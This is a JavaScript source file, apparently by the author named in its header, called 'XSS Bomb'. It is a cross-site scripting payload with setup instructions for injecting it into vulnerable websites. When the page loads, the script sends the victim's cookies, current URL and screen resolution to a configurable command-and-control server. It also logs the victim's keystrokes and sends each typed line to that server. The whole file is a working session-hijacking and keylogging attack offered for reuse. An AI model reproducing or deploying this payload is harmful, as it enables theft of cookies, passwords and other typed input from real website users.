/*
 *  _  _  ___  ___           ,--.!,
 * ( \/ )/ __)/ __)       __/   -*-
 *  )  ( \__ \\__ \     ,d08b.  '|`
 * (_/\_)(___/(___/     0088MM
 *                      `9MMP'
 *
 * File Name: xss_bomb.js
 * Made by: p4p1 (Leo Smith)
 * Web Page: https://leosmith.xyz
 *
 * Description:
 *  XSS Bomb is an xss file used to do some reconnaissance and gather data
 *  on vulnerable websites. If you wish to reuse this file, please go through
 *  the step by step guide on how to use it inside of this file.
 * Usage:
 *  You can look for the {CHANGEME} string inside of this file to know what you
 *  need to change.
 * Step by Step guide:
 *  1. Configure the script
 *  2. Setup a command and control sever to receive the data
 *  3. Inject the script inside of a webpage
 *  4. Inspect the data on your server
 */

/*
 * Configuration variables
 */
const version = '0.0.1';
const color = 'background: #000; color: #bada55';
const color_ok = 'background: #000; color: #01FE23';
const color_ko = 'background: #000; color: #FE0101';
const verbose_mode = 1;

const request_type = '{CHANGEME}'; // can be changed to 'POST' or others if needed
const server_control = '{CHANGEME}';
                            /* here you should provide you server where you can
                               log the received input */
/*
 * global variables
 */
var input_text = "";

/*
 * Functions
 */
function check_server() {
  const request = new Request(server_control + '/status_check', {
    method: request_type,
    mode: 'no-cors'
  });
  fetch(request).then((response) => {
    if (verbose_mode) {console.log("%c  \tStatus: ok", color_ok);}
  }).catch((erro) => {
    if (verbose_mode) {console.log("%c  \tStatus: ko", color_ko);console.error(erro);}
  });
}

function send_server(data) {
  var request = undefined;
  if (request_type == 'POST') {
    request = new Request(server_control, {
      method: request_type,
      mode: 'no-cors',
      body: data
    });
  } else {
    request = new Request(server_control + "?" + data, {
      method: request_type,
      mode: 'no-cors',
    });
  }
  fetch(request).then((response) => {
    if (verbose_mode) {
      console.log("%c SENDING INFO:", color);
      console.log("%c  Sent data: %s", color, data);
      console.log("%c  Status: ok", color_ok);
    }
  }).catch((erro) => {
    if (verbose_mode) {console.log("%c  \tStatus: ko", color_ko);console.error(erro);}
  });
}

function send_key(event) {
  if (event.key == 'Enter' && input_text.length > 0) {
    send_server("keypress=" + input_text);
    input_text = '';
  } else {
    if (event.key != 'Enter') {
      input_text += event.key;
    }
  }
}

/*
 * Main Script
 */
if (verbose_mode) {
  console.log("%c            _  _  ___  ___                  ,--.!,                 ", color);
  console.log("%c           ( \\/ )/ __)/ __)              __/   -*-                 ", color);
  console.log("%c            )  ( \\__ \\\\__ \\            ,d08b.  '|`                 ", color);
  console.log("%c           (_/\\_)(___/(___/            0088MM                      ", color);
  console.log("%c                                       `9MMP'                      ", color);
  console.log("%c  WELCOME TO XSS BOMB!!! - Version: %s - https://leosmith.xyz/  ", color, version);
  console.log("%c  Config:", color);
  console.log("%c  \tControl Server = %s", color, server_control);
  console.log("%c  \tRequest Types = %s", color, request_type);
  console.log("%c  Info:", color);
  console.log("%c  \tCookies = %s", color, (document.cookie.length) ? document.cookie : "(null)");
  console.log("%c  \tCurrent page = %s", color, document.location.href);
  console.log("%c  \tResolution = %dx%d", color, screen.width, screen.height);
  console.log("%c  Checking server status:", color);
  check_server();
}

send_server("cookies=" + document.cookie +
"&current_page=" + document.location.href +
"&resolution=" + screen.width + "x" + screen.height);
document.addEventListener('keypress', send_key);
